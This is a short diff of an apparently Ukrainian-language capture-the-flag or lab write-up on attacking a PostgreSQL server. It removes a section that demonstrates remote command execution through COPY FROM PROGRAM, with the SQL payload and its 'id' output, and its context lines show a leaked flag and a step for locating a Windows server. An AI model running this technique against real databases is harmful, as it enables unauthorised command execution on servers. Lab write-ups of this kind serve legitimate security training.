@@ -183,17 +183,6 @@ SELECT config_key, config_val FROM system_config;
 telemetry_api_key | flag{0mg_RC3}
 ```
 
-**Демонстрація RCE (COPY FROM PROGRAM):**
-```sql
-CREATE TABLE IF NOT EXISTS cmd_exec (output text);
-TRUNCATE cmd_exec;
-COPY cmd_exec FROM PROGRAM 'id';
-SELECT * FROM cmd_exec;
-```
-```
-uid=128(postgres) gid=135(postgres)
-```
-
 **Знайти IP Windows Server через БД:**
 ```sql
 SELECT DISTINCT managed_by FROM software_licenses;
